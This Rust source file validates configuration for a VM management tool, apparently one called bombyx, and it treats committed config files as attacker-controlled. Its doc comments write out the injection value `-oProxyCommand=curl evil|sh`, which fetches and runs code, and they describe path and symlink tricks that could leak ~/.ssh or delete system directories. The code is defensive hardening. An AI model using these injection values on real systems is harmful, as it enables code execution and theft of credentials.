//! Project configuration (`bombyx.toml`).
//!
//! A bombyx project keeps its VM definition in the project
//! repo, not on the VM host: the repo is the source of
//! truth and the host holds only a cache. This module reads
//! that per-project configuration.
//!
//! **The VM host is not part of it.** Which machine runs the
//! VMs is a property of the developer, not of the project --
//! each person has their own hardware on their own network --
//! so `host` comes from a per-developer file, the environment
//! or `--host`, and is refused in `bombyx.toml`. See
//! [`HostSources`] for the order they are consulted in.
//!
//! Because `bombyx.toml` ships *inside a repo*, it is
//! attacker-controlled data the moment you clone or check out
//! someone else's branch. Every field is therefore validated
//! against an explicit allowlist rather than trusted -- see
//! `Config::validate`, which every constructor runs. Not a
//! doc link: `validate` is private, and rustdoc rejects a
//! public page pointing at a private item.

use std::path::{Component, Path, PathBuf};

use serde::Deserialize;
use thiserror::Error;

use crate::name::{ScratchName, check_segment};

/// Default directory (relative to the project root) holding
/// the Vagrantfile and provisioning scripts.
const DEFAULT_VAGRANT_DIR: &str = "vagrant";

/// Default root on the VM host under which project
/// directories are created.
const DEFAULT_REMOTE_ROOT: &str = "~/vms";

/// Largest configuration file that will be read.
///
/// Generous for a handful of keys, and small enough that a file
/// committed to a repo cannot make bombyx read it into memory
/// without bound.
const MAX_CONFIG_BYTES: u64 = 64 * 1024;

/// Errors produced while loading a project configuration.
#[derive(Debug, Error)]
pub enum ConfigError {
    /// The configuration file does not exist.
    #[error("config file not found: {}", .0.display())]
    NotFound(PathBuf),

    /// The configuration file could not be read.
    #[error("failed to read {}: {source}", .path.display())]
    Read {
        /// Path that could not be read.
        path: PathBuf,
        /// Underlying I/O error.
        source: std::io::Error,
    },

    /// A configuration path exists but is not a regular file.
    #[error("{} is not a regular file", .0.display())]
    NotAFile(PathBuf),

    /// A configuration file is implausibly large.
    #[error("{} is larger than {MAX_CONFIG_BYTES} bytes", .0.display())]
    TooLarge(PathBuf),

    /// The configuration file is not valid TOML, or does not
    /// match the expected shape.
    #[error("invalid config in {}: {source}", .path.display())]
    Parse {
        /// Path that failed to parse.
        path: PathBuf,
        /// Underlying TOML error.
        source: toml::de::Error,
    },

    /// A required field was present but empty.
    #[error("`{field}` must not be empty")]
    Empty {
        /// Name of the offending field.
        field: &'static str,
    },

    /// A field held a value outside its allowed shape.
    #[error("invalid `{field}`: {reason}")]
    Invalid {
        /// Name of the offending field.
        field: &'static str,
        /// What rule the value broke.
        reason: String,
    },

    /// The committed project file carried a `host` key.
    ///
    /// Refused rather than ignored. A committed host names one
    /// developer's machine, and a stale one that still parses
    /// is how `destroy` ends up deleting a directory on a
    /// colleague's host.
    #[error(
        "`host` is not allowed in {}: it names one developer's \
         machine, and this file is committed. Move that line to \
         {places}",
        .path.display()
    )]
    HostInProjectFile {
        /// The project file carrying the key.
        path: PathBuf,
        /// Where the value belongs instead.
        places: String,
    },

    /// No source supplied a VM host.
    #[error(
        "no VM host configured -- set it in {places}, pass \
         --host, or set {HOST_ENV}"
    )]
    HostMissing {
        /// The files that would supply one.
        places: String,
    },

    /// The winning source supplied an unusable host.
    ///
    /// Separate from [`ConfigError::Invalid`] so the message can
    /// name *where the value came from*. As a plain field error
    /// the only path in it was the project file's -- the one file
    /// now forbidden to carry a host -- so the message sent the
    /// operator to edit the wrong thing.
    #[error("invalid VM host from {origin}: {reason}")]
    InvalidHost {
        /// Which source supplied it.
        origin: String,
        /// What rule the value broke.
        reason: String,
    },
}

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// Characters allowed in a path on the VM host.
fn is_remote_path_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~')
}

/// Fewest real segments `remote_root` must contain.
///
/// One, so `<root>/<project>` is always at least two deep.
/// bombyx deletes that directory on teardown, and two segments
/// is the floor below which a configuration mistake stops being
/// recoverable: it keeps a root of `/` or `~` from making the
/// target a top-level or home-adjacent directory.
const MIN_ROOT_SEGMENTS: usize = 1;

/// The meaningful segments of a remote path.
///
/// Drops the leading `~` root marker and any empty segment left
/// by a doubled or trailing slash, so counting the result
/// measures real depth rather than characters. A `.` segment is
/// deliberately *kept*: the caller's job is to reject it, and
/// filtering it here would let `~/.` pass as depth one.
pub(crate) fn path_segments(path: &str) -> Vec<&str> {
    path.strip_prefix('~')
        .unwrap_or(path)
        .split('/')
        .filter(|s| !s.is_empty())
        .collect()
}

/// File name of the per-developer configuration, inside the
/// directory [`user_config_dir`] returns.
pub const USER_CONFIG_FILE: &str = "config.toml";

/// Environment variable naming the VM host directly.
pub const HOST_ENV: &str = "BOMBYX_HOST";

/// Environment variable relocating the per-developer config
/// directory.
///
/// Exists so a test -- or an operator keeping several setups
/// apart -- can point bombyx at a directory of its own instead
/// of the real one.
pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";

/// A resolved bombyx configuration.
///
/// The project fields come from `bombyx.toml`; `host` does not
/// (see [`HostSources`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Config {
    /// SSH host alias of the VM host, e.g. `vmhost`.
    ///
    /// Resolved through the user's `~/.ssh/config`, so
    /// bombyx never deals with addresses or usernames.
    ///
    /// **Never read from `bombyx.toml`.** The VM host is a
    /// property of the person driving bombyx, not of the
    /// project: everyone on a team has their own machine on
    /// their own network, and a committed file can name only
    /// one of them -- pointing everyone else's `destroy` at a
    /// colleague's host.
    pub host: String,

    /// Project name. Doubles as the directory name on the
    /// VM host.
    pub project: String,

    /// Directory in the project repo holding the Vagrantfile.
    pub vagrant_dir: String,

    /// Root directory on the VM host under which project
    /// directories are created.
    pub remote_root: String,
}

/// The committed project file, exactly as it parses.
///
/// Separate from [`Config`] because the two differ: this is
/// what `bombyx.toml` may contain, and `Config` is what bombyx
/// runs with after a host has been found elsewhere.
///
/// `host` appears here only so it can be *rejected* by name.
/// Leaving it out would make `deny_unknown_fields` report
/// "unknown field `host`", which reads as a typo rather than as
/// a field that deliberately moved.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct ProjectFile {
    host: Option<String>,

    project: String,

    #[serde(default = "default_vagrant_dir")]
    vagrant_dir: String,

    #[serde(default = "default_remote_root")]
    remote_root: String,
}

/// The per-developer configuration file.
///
/// Only `host` for now. It is a separate shape from [`Overlay`]
/// because this file is not beside a project and cannot
/// meaningfully carry `project`.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct UserFile {
    host: Option<String>,
}

/// Where a VM host name may come from, highest precedence
/// first.
///
/// The binary fills this in from its command line and
/// environment; tests construct it directly, which is why the
/// environment is a field rather than something read in place.
#[derive(Debug, Clone, Default)]
pub struct HostSources<'a> {
    /// `--host`, for a one-off run against another machine.
    pub flag: Option<&'a str>,

    /// The [`HOST_ENV`] environment variable.
    pub env: Option<&'a str>,

    /// Directory holding [`USER_CONFIG_FILE`], usually from
    /// [`user_config_dir`].
    pub user_config_dir: Option<&'a Path>,
}

/// A path as it appears in a message.
fn path_display(path: &Path) -> String {
    path.display().to_string()
}

/// What is wrong with a host value.
///
/// One rule, two error shapes. [`Config::validate`] reports it as
/// a *field* problem, and [`Config::load`] reports it as a
/// problem with a *source* -- naming `--host` or the file the
/// value came from. Writing the rule once is what keeps the two
/// messages from drifting apart.
enum HostProblem {
    /// Blank, so no host at all.
    Empty,
    /// Present but outside the allowed shape.
    Invalid(String),
}

/// Checks a host value, whatever supplied it.
///
/// `host` reaches `ssh` and `scp` as their first positional
/// argument and neither honours a `--` end-of-options separator,
/// so a leading `-` is read as an option:
/// `-oProxyCommand=curl evil|sh` runs code on this workstation
/// from a bare `bombyx status`, before any network traffic.
fn host_problem(value: &str) -> Option<HostProblem> {
    if value.trim().is_empty() {
        return Some(HostProblem::Empty);
    }
    if value.starts_with('-') {
        return Some(HostProblem::Invalid(
            "must not start with `-`, which ssh and scp read as \
             an option"
                .to_owned(),
        ));
    }
    if let Some(bad) = value.chars().find(|c| !is_host_char(*c)) {
        return Some(HostProblem::Invalid(format!(
            "character {bad:?} is not allowed; use only letters, \
             digits, `.`, `_`, `-` or `@`"
        )));
    }
    None
}

/// Whether an environment-supplied directory is safe to use.
///
/// Requires an anchored path: a POSIX root, a Windows root, or a
/// drive *with* a separator. Rooted spellings are checked
/// directly rather than through [`Path::is_absolute`], which
/// answers per-platform -- `C:\x` is not absolute on Unix and
/// `/x` is not absolute on Windows, while this same code reads
/// the same environment on both.
///
/// `C:cfg` is refused along with `cfg`: a drive-relative path
/// resolves against that drive's current directory, which is not
/// a location the operator chose either.
fn is_anchored_dir(value: &str) -> bool {
    let value = value.trim();
    if value.starts_with('/') || value.starts_with('\\') {
        return true;
    }
    let bytes = value.as_bytes();
    bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'/' || bytes[2] == b'\\')
}

/// Returns the directory holding the per-developer config.
///
/// [`CONFIG_DIR_ENV`] wins when set. Otherwise this is
/// `%APPDATA%\bombyx` on Windows and
/// `$XDG_CONFIG_HOME/bombyx` -- or `$HOME/.config/bombyx` --
/// elsewhere. `None` when the environment names no home at
/// all, which is a machine bombyx cannot guess about.
///
/// Every value must be an *anchored* path; a blank or relative
/// one counts as unset and the next source is consulted. A
/// relative value would otherwise resolve against the working
/// directory, which on this tool means taking the VM host out of
/// whatever repo bombyx was run in.
#[must_use]
pub fn user_config_dir() -> Option<PathBuf> {
    config_dir_from(|key| std::env::var(key).ok(), cfg!(windows))
}

/// [`user_config_dir`] against an arbitrary environment.
///
/// `var` is split out so the precedence is testable without
/// mutating the process environment, which is global and would
/// make these tests race each other. `windows` is split out for
/// the same reason and gates `APPDATA`.
///
/// **`APPDATA` is consulted only when `windows`.** It is
/// routinely set in processes that are not Windows -- under WSL
/// via `WSLENV`, under Wine, in some CI images -- so checking it
/// unconditionally made a Linux run read a *Windows* config
/// directory in preference to `$HOME/.config`, silently taking
/// the host name from a file the docs said applied only to
/// Windows.
fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
where
    F: Fn(&str) -> Option<String>,
{
    // A value that is blank *or not anchored* is treated as
    // unset, and the next source is consulted.
    //
    // Blank was the original rule, for a stated reason: set to
    // "" by a launcher script it would resolve to a relative
    // `bombyx/config.toml` in the working directory, which on
    // this tool means reading a host name out of the repo -- the
    // one thing this design removes. A *non-blank relative*
    // value does exactly the same thing and was not covered:
    // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
    // `XDG_CONFIG_HOME=.config` reads
    // `./.config/bombyx/config.toml`, and `..` walks out of the
    // tree. Such a value arrives from a per-directory
    // environment (`direnv`, a `mise.toml` in a clone, a CI job)
    // or a plain typo, and the host it supplies decides where
    // `up` scps an archive and where `destroy` runs `rm -rf`.
    let set = |key: &str| {
        var(key)
            .filter(|v| is_anchored_dir(v))
            .map(|v| v.trim().to_owned())
    };

    if let Some(dir) = set(CONFIG_DIR_ENV) {
        return Some(PathBuf::from(dir));
    }
    if windows {
        return set("APPDATA")
            .map(|appdata| Path::new(&appdata).join("bombyx"));
    }
    if let Some(xdg) = set("XDG_CONFIG_HOME") {
        return Some(Path::new(&xdg).join("bombyx"));
    }
    let home = set("HOME")?;
    Some(Path::new(&home).join(".config").join("bombyx"))
}

fn default_vagrant_dir() -> String {
    DEFAULT_VAGRANT_DIR.to_owned()
}

fn default_remote_root() -> String {
    DEFAULT_REMOTE_ROOT.to_owned()
}

/// Per-project overrides, read from a file beside the config.
///
/// Every field is optional, so an overlay names only what
/// differs. This is the escape hatch for one repo that needs
/// something other than the shared value -- a second VM host
/// for one project, or a different `remote_root` on one
/// machine. The usual per-developer host lives in the
/// `config.toml` that [`HostSources::user_config_dir`] points
/// at, not here; this file outranks it.
///
/// The same `deny_unknown_fields` treatment as the project
/// file: a typo here must be an error rather than a setting
/// that silently does nothing.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Overlay {
    /// Supplies [`Config::host`] for this project, outranked
    /// only by `--host` and [`HOST_ENV`].
    ///
    /// [`Config::load`] *takes* this value while ranking the
    /// sources, so the overlay it later merges carries `None`.
    /// [`Config::with_overlay`] therefore never applies it --
    /// see that method.
    pub host: Option<String>,
    /// Replaces [`Config::project`].
    pub project: Option<String>,
    /// Replaces [`Config::vagrant_dir`].
    pub vagrant_dir: Option<String>,
    /// Replaces [`Config::remote_root`].
    pub remote_root: Option<String>,
}

/// Overwrites `dst` when the overlay supplied a value.
fn replace(dst: &mut String, src: Option<String>) {
    if let Some(value) = src {
        *dst = value;
    }
}

impl ProjectFile {
    /// Assembles a [`Config`], applying `overlay` to the
    /// project fields.
    fn into_config(self, host: String, overlay: Option<Overlay>) -> Config {
        let cfg = Config {
            host,
            project: self.project,
            vagrant_dir: self.vagrant_dir,
            remote_root: self.remote_root,
        };
        match overlay {
            Some(overlay) => cfg.with_overlay(overlay),
            None => cfg,
        }
    }
}

/// Refuses a project file carrying a `host` key.
///
/// Ignoring it with a warning was the alternative, and it is
/// worse: the key stays committed in the repo, the warning gets
/// tuned out, and the next reader cannot tell whether the value
/// is in force. An error is read once and fixed once.
fn reject_host_key(
    file: &ProjectFile,
    path: &Path,
    sources: &HostSources,
) -> Result<(), ConfigError> {
    if file.host.is_none() {
        return Ok(());
    }
    Err(ConfigError::HostInProjectFile {
        path: path.to_path_buf(),
        places: host_places(sources, local_config_path(path).as_deref()),
    })
}

/// Which source supplied [`Config::host`].
///
/// Returned by [`Config::load`] so a caller can *report* the
/// winner instead of re-deriving it. The binary printed the
/// provenance by re-testing the flag and the environment itself,
/// which duplicated the precedence rule below in code no library
/// test could reach: rank the overlay differently here, and the
/// message kept naming the old winner.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HostOrigin {
    /// The `--host` flag.
    Flag,
    /// The [`HOST_ENV`] environment variable.
    Env,
    /// A `bombyx.local.toml` beside the project file.
    Overlay,
    /// The per-developer [`USER_CONFIG_FILE`].
    UserFile,
}

impl std::fmt::Display for HostOrigin {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let name = match self {
            Self::Flag => "--host",
            Self::Env => HOST_ENV,
            Self::Overlay => "bombyx.local.toml",
            Self::UserFile => USER_CONFIG_FILE,
        };
        f.write_str(name)
    }
}

/// Finds the VM host, highest-precedence source first.
///
/// `local` is the overlay's path, named only in the
/// no-host-anywhere error.
///
/// Takes the overlay by `&mut` and *removes* the host it finds,
/// so the value is consumed where it is ranked. What is left
/// provably carries no host, which is what makes
/// [`Config::with_overlay`] ignoring the field safe rather than
/// merely intended.
///
/// The per-developer file is read *last* and only if it is
/// needed, so `--host` works on a machine whose file is absent
/// or broken.
///
/// A blank [`HOST_ENV`] counts as unset. An exported-but-empty
/// variable is how a shell says "no value", and reporting "no
/// VM host configured" is more use than an empty-field error.
/// A host supplied directly by the caller is *not* treated that
/// way: it was asked for, so the empty-value error names it.
fn resolve_host(
    sources: &HostSources,
    overlay: Option<&mut Overlay>,
    local: Option<&Path>,
) -> Result<(String, HostOrigin), ConfigError> {
    if let Some(host) = sources.flag {
        return Ok((host.to_owned(), HostOrigin::Flag));
    }
    if let Some(host) = sources.env.filter(|v| !v.trim().is_empty()) {
        return Ok((host.to_owned(), HostOrigin::Env));
    }
    if let Some(host) = overlay.and_then(|o| o.host.take()) {
        return Ok((host, HostOrigin::Overlay));
    }
    if let Some(dir) = sources.user_config_dir {
        let path = dir.join(USER_CONFIG_FILE);
        if let Some(source) = read_optional(&path, Symlinks::Follow)? {
            let file: UserFile = from_toml(&source, &path)?;
            if let Some(host) = file.host {
                return Ok((host, HostOrigin::UserFile));
            }
        }
    }
    Err(ConfigError::HostMissing {
        places: host_places(sources, local),
    })
}

/// Names the files that can carry a host, for an error message.
///
/// Both are paths the operator can act on, so they are printed
/// in full rather than described.
fn host_places(sources: &HostSources, local: Option<&Path>) -> String {
    let user = sources.user_config_dir.map(|d| d.join(USER_CONFIG_FILE));
    match (user, local) {
        (Some(user), Some(local)) => {
            format!("{} or {}", user.display(), local.display())
        }
        (Some(user), None) => user.display().to_string(),
        (None, Some(local)) => local.display().to_string(),
        // No home directory in the environment and no project
        // file with a name, so there is nothing concrete to
        // point at.
        (None, None) => {
            format!("a {USER_CONFIG_FILE} in your config directory")
        }
    }
}

/// Requires a path that stays inside the project directory.
///
/// The value is joined onto the working directory, and
/// `Path::join` with an absolute operand *discards* the left
/// side -- so `vagrant_dir = "/etc"` makes `up` archive `/etc`
/// rather than a directory in the project. Since `bombyx.toml`
/// travels inside a repo, that turned a clone into
/// "tar the operator's `~/.ssh` and scp it to the host named in
/// the same file".
///
/// Rooted spellings are checked directly rather than left to
/// [`Path::is_absolute`], because that answers per-platform: a
/// Windows drive prefix is not absolute on Unix, and the same
/// config file is read on both.
fn check_project_relative(
    field: &'static str,
    value: &str,
) -> Result<(), ConfigError> {
    let invalid = |reason: &str| ConfigError::Invalid {
        field,
        reason: reason.to_owned(),
    };

    let bytes = value.as_bytes();
    if bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
        return Err(invalid("must not name a drive"));
    }
    if value.starts_with('/') || value.starts_with('\\') {
        return Err(invalid("must be relative to the project directory"));
    }
    if value.starts_with('~') {
        return Err(invalid("must not start with `~`"));
    }

    // Everything left must be an ordinary segment. This is what
    // rejects `..` and `.`, in any position rather than only at
    // the front.
    for component in Path::new(value).components() {
        if !matches!(component, Component::Normal(_)) {
            return Err(invalid(
                "must be a plain relative path, with no `.`, \
                 `..` or root",
            ));
        }
    }

    Ok(())
}

/// Deserializes TOML, naming `path` in any error.
fn from_toml<T>(source: &str, path: &Path) -> Result<T, ConfigError>
where
    T: serde::de::DeserializeOwned,
{
    toml::from_str(source).map_err(|source| ConfigError::Parse {
        path: path.to_path_buf(),
        source,
    })
}

/// Whether a config file may be a symlink.
///
/// Named rather than a bare `bool` so the two call sites read as
/// a policy choice instead of a flag.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Symlinks {
    /// Judge the path as itself: a symlink is refused. For files
    /// beside the project config, whose path a repo influences.
    Refuse,
    /// Follow the link, still requiring a regular file at the
    /// end. For the operator's own dotfile.
    Follow,
}

/// Reads a config file that is allowed not to exist.
///
/// Absence is `None`. Anything else is an error rather than a
/// fallback: a config that exists but cannot be read is a
/// problem to report, not a reason to quietly send commands to
/// the host the operator meant to override.
///
/// Anything that is not a regular file is rejected -- pointed at
/// `/dev/zero` or a FIFO, reading would hang or allocate without
/// bound -- and the size cap bounds an ordinary large file.
///
/// `symlinks` decides how the path itself is judged, and the two
/// answers are not arbitrary:
///
/// - [`Symlinks::Refuse`] for `bombyx.toml` and the overlay
///   beside it. That path is *derived* and a repo can commit a
///   symlink there; pointed at `~/.ssh/id_ed25519` it would make
///   the TOML parse error echo a line of the key to stderr.
/// - [`Symlinks::Follow`] for the per-developer `config.toml`.
///   Nothing in a clone can create or retarget a file in the
///   operator's own config directory, so the refusal buys nothing
///   there -- and it broke every ordinary dotfile manager
///   (`stow`, `chezmoi`, a hand-made `ln -s`), which symlink
///   exactly this kind of file into place. The failure was a hard
///   error on every subcommand whose message did not mention
///   symlinks.
fn read_optional(
    path: &Path,
    symlinks: Symlinks,
) -> Result<Option<String>, ConfigError> {
    use std::io::Read as _;

    let stat = match symlinks {
        Symlinks::Refuse => std::fs::symlink_metadata,
        Symlinks::Follow => std::fs::metadata,
    };

    let meta = match stat(path) {
        Ok(meta) => meta,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            return Ok(None);
        }
        Err(source) => {
            return Err(ConfigError::Read {
                path: path.to_path_buf(),
                source,
            });
        }
    };

    if !meta.is_file() {
        return Err(ConfigError::NotAFile(path.to_path_buf()));
    }

    let read = |source| ConfigError::Read {
        path: path.to_path_buf(),
        source,
    };

    let file = std::fs::File::open(path).map_err(read)?;
    let mut source = String::new();
    // One byte past the cap, so a file *at* the limit is
    // accepted and anything beyond it is detectable rather than
    // silently truncated into a confusing parse error.
    file.take(MAX_CONFIG_BYTES + 1)
        .read_to_string(&mut source)
        .map_err(read)?;

    if source.len() as u64 > MAX_CONFIG_BYTES {
        return Err(ConfigError::TooLarge(path.to_path_buf()));
    }

    Ok(Some(source))
}

/// Where the overlay for `path` lives, if it can have one.
///
/// Beside the file it overrides, named `<stem>.local.toml`: the
/// original extension is *replaced*, not preserved, so
/// `staging.toml` and `staging.yaml` would share
/// `staging.local.toml`. Deriving it from the argument rather
/// than fixing one name is what makes `--config staging.toml`
/// look for `staging.local.toml`, so the override is always
/// discoverable from the file it overrides.
///
/// `None` when `path` has no file name at all -- `..`, or a
/// bare directory. Returning a path there would put the overlay
/// *beside* the directory rather than in it, which is a
/// surprise nobody asked for.
#[must_use]
pub fn local_config_path(path: &Path) -> Option<PathBuf> {
    let stem = path.file_stem()?;
    let mut name = stem.to_os_string();
    name.push(".local.toml");
    Some(path.with_file_name(name))
}

impl Config {
    /// Returns this configuration with `overlay` applied.
    ///
    /// Does not validate: the caller validates once, after
    /// merging, so an overlay cannot become the one path into
    /// the config that skips the checks the base file passes.
    ///
    /// **`Overlay::host` is not applied.** The host is ranked
    /// against `--host` and [`HOST_ENV`] by [`Config::load`],
    /// which *takes* the overlay's value in the process, so the
    /// overlay reaching this method carries `None`. Applying it
    /// here as well would silently promote the file above two
    /// sources that outrank it. A caller building an [`Overlay`]
    /// by hand and setting `host` will find it ignored -- resolve
    /// the host first and pass it to [`Config::parse`] instead.
    #[must_use]
    pub fn with_overlay(mut self, overlay: Overlay) -> Self {
        // Destructured rather than read field by field: adding
        // a field to `Overlay` then fails to compile here,
        // instead of parsing fine and silently doing nothing.
        let Overlay {
            host: _,
            project,
            vagrant_dir,
            remote_root,
        } = overlay;

        replace(&mut self.project, project);
        replace(&mut self.vagrant_dir, vagrant_dir);
        replace(&mut self.remote_root, remote_root);
        self
    }

    /// Parses a project file, with `host` supplied separately.
    ///
    /// `path` is used only for error messages.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Parse`] if the source is not
    /// valid TOML or carries an unknown key,
    /// [`ConfigError::HostInProjectFile`] if it carries a
    /// `host` key, and [`ConfigError::Empty`] /
    /// [`ConfigError::Invalid`] if a field fails validation.
    pub fn parse(
        source: &str,
        path: &Path,
        host: &str,
    ) -> Result<Self, ConfigError> {
        let file: ProjectFile = from_toml(source, path)?;
        reject_host_key(&file, path, &HostSources::default())?;
        let cfg = file.into_config(host.to_owned(), None);
        cfg.validate()?;
        Ok(cfg)
    }

    /// The config every module's tests use.
    ///
    /// One copy, next to the type it builds. The same four lines
    /// were written out in four test modules, so adding a required
    /// field meant four identical edits and the two literals were
    /// pinned in four places.
    #[cfg(test)]
    #[must_use]
    pub(crate) fn for_tests() -> Self {
        Self::parse(
            "project = \"myproject\"\n",
            Path::new("bombyx.toml"),
            "vmhost",
        )
        .expect("the shared test config must be valid")
    }

    /// Loads a configuration: the project file, the overlay
    /// beside it, and a VM host from `sources`.
    ///
    /// **This reads up to three paths.** After `path`, it looks
    /// for the overlay named by [`local_config_path`] --
    /// `bombyx.toml` next to `bombyx.local.toml` -- and merges
    /// it over the file when present. If neither `sources.flag`,
    /// `sources.env` nor the overlay names a host, the
    /// per-developer file in `sources.user_config_dir` is read
    /// for one. An optional file that exists but cannot be read
    /// or parsed is an error rather than a silent fallback.
    ///
    /// The user file is read only when nothing else supplied a
    /// host, so `--host` still works on a machine whose
    /// per-developer file is missing or broken.
    ///
    /// Validation runs once, after everything is merged, so an
    /// override is subject to the same rules as the file it
    /// overrides.
    ///
    /// Returns the winning [`HostOrigin`] alongside the config,
    /// so a caller reporting which host is in force does not
    /// re-derive the precedence rule.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::NotFound`] if `path` is absent,
    /// [`ConfigError::Read`] if a file cannot be read,
    /// [`ConfigError::NotAFile`] or [`ConfigError::TooLarge`]
    /// if one is not a plain file of sensible size,
    /// [`ConfigError::Parse`] if one is not valid TOML,
    /// [`ConfigError::HostInProjectFile`] if the project file
    /// carries a `host` key, [`ConfigError::HostMissing`] if no
    /// source names a host, and [`ConfigError::Empty`] /
    /// [`ConfigError::Invalid`] if a field fails validation
    /// after merging. The path carried by an error may be an
    /// optional file's rather than `path`.
    pub fn load(
        path: &Path,
        sources: &HostSources,
    ) -> Result<(Self, HostOrigin), ConfigError> {
        // Absence is the one io error that means something
        // different for the two files, so it is mapped here
        // rather than inside the shared reader.
        let source = read_optional(path, Symlinks::Refuse)?
            .ok_or_else(|| ConfigError::NotFound(path.to_path_buf()))?;

        let file: ProjectFile = from_toml(&source, path)?;
        reject_host_key(&file, path, sources)?;

        let local = local_config_path(path);
        let mut overlay = match &local {
            Some(local) => match read_optional(local, Symlinks::Refuse)? {
                Some(source) => Some(from_toml::<Overlay>(&source, local)?),
                None => None,
            },
            None => None,
        };

        let (host, origin) =
            resolve_host(sources, overlay.as_mut(), local.as_deref())?;

        // Checked here, while the winning source is still known,
        // so the message names the file (or flag) actually
        // carrying the bad value rather than the project file.
        if let Some(problem) = host_problem(&host) {
            return Err(ConfigError::InvalidHost {
                origin: match origin {
                    HostOrigin::Overlay => local
                        .as_deref()
                        .map_or_else(|| origin.to_string(), path_display),
                    HostOrigin::UserFile => sources
                        .user_config_dir
                        .map(|d| d.join(USER_CONFIG_FILE))
                        .map_or_else(
                            || origin.to_string(),
                            |p| path_display(&p),
                        ),
                    HostOrigin::Flag | HostOrigin::Env => origin.to_string(),
                },
                reason: match problem {
                    HostProblem::Empty => "must not be empty".to_owned(),
                    HostProblem::Invalid(reason) => reason,
                },
            });
        }

        // Validation happens once, after merging. Validating
        // the base first would let an overlay set a value the
        // base file could never carry.
        let cfg = file.into_config(host, overlay);
        cfg.validate()?;
        Ok((cfg, origin))
    }

    /// Rejects values that are empty or outside their allowed
    /// shape.
    ///
    /// The `host` rules matter most. `host` is passed as the
    /// first positional argument to `ssh` and `scp`, and
    /// neither program honours a `--` end-of-options
    /// separator. A value starting with `-` is therefore read
    /// as an *option*, so `-oProxyCommand=curl evil|sh` runs
    /// code on this workstation from a bare `bombyx status`,
    /// before any network traffic.
    ///
    /// That value can no longer arrive from a cloned repo,
    /// because `host` is refused in `bombyx.toml` (see
    /// [`ConfigError::HostInProjectFile`]). The check stays for
    /// the sources that remain: a gitignored
    /// `bombyx.local.toml`, a per-developer `config.toml`, and
    /// `--host` / [`HOST_ENV`], all of which a mistake or a
    /// careless script can still fill in. The other fields are
    /// still repo-supplied, so their rules carry the original
    /// weight.
    fn validate(&self) -> Result<(), ConfigError> {
        // The host rule lives in `host_problem`, so this and the
        // source-naming check in `load` cannot disagree.
        match host_problem(&self.host) {
            Some(HostProblem::Empty) => {
                return Err(ConfigError::Empty { field: "host" });
            }
            Some(HostProblem::Invalid(reason)) => {
                return Err(ConfigError::Invalid {
                    field: "host",
                    reason,
                });
            }
            None => {}
        }

        for (field, value) in [
            ("project", &self.project),
            ("vagrant_dir", &self.vagrant_dir),
            ("remote_root", &self.remote_root),
        ] {
            if value.trim().is_empty() {
                return Err(ConfigError::Empty { field });
            }
            if value.starts_with('-') {
                return Err(ConfigError::Invalid {
                    field,
                    reason: "must not start with `-`, which \
                             ssh and scp read as an option"
                        .to_owned(),
                });
            }
        }

        // `project` becomes one directory name on the host.
        check_segment(&self.project).map_err(|e| ConfigError::Invalid {
            field: "project",
            reason: e.to_string(),
        })?;

        // `vagrant_dir` is the one field that names a path on
        // *this* machine, so it is the one that can point the
        // archive at something outside the project.
        check_project_relative("vagrant_dir", &self.vagrant_dir)?;

        charset(
            "remote_root",
            &self.remote_root,
            is_remote_path_char,
            "letters, digits, `.`, `_`, `-`, `/` or `~`",
        )?;
        // Everything below exists because bombyx *deletes* the
        // directory it derives from `remote_root`. All of it is
        // enforced once, here, so every command agrees on which
        // roots are usable -- gating only the removal would
        // leave `up` free to extract a tarball into `/etc` while
        // teardown refused to touch it. `bombyx.toml` travels
        // inside a repo, so this is attacker-controlled input.
        //
        // The root must be anchored. An unrooted value resolves
        // against the SSH login directory, which makes the depth
        // below meaningless.
        if !(self.remote_root.starts_with('~')
            || self.remote_root.starts_with('/'))
        {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: "must start with `~` or `/`; a relative \
                         path resolves against the login \
                         directory"
                    .to_owned(),
            });
        }

        // `..` escapes the root outright. `.` is subtler and was
        // the hole in the first version of this check: it adds a
        // segment without adding depth, so `remote_root = "/."`
        // with `project = "etc"` counted as two segments deep
        // while resolving to `/etc`.
        let segments = path_segments(&self.remote_root);
        if let Some(bad) = segments.iter().find(|s| **s == "." || **s == "..") {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: format!(
                    "must not contain a `{bad}` segment; it changes \
                     where the path resolves without changing how \
                     deep it looks"
                ),
            });
        }

        if segments.len() < MIN_ROOT_SEGMENTS {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: format!(
                    "must be at least {MIN_ROOT_SEGMENTS} directory \
                     deep, so the project directory bombyx creates \
                     and deletes is not a top-level one"
                ),
            });
        }

        // A `~` is only expanded by the remote shell in
        // leading position; anywhere else it is a literal
        // character and almost certainly a mistake.
        if self
            .remote_root
            .char_indices()
            .any(|(i, c)| c == '~' && i > 0)
        {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: "`~` is only allowed as the first \
                         character"
                    .to_owned(),
            });
        }

        // `vagrant_dir` is a local path, so it must tolerate
        // Windows spellings (`infra\vm`, `C:\...`). Only
        // control characters are refused.
        if self.vagrant_dir.chars().any(char::is_control) {
            return Err(ConfigError::Invalid {
                field: "vagrant_dir",
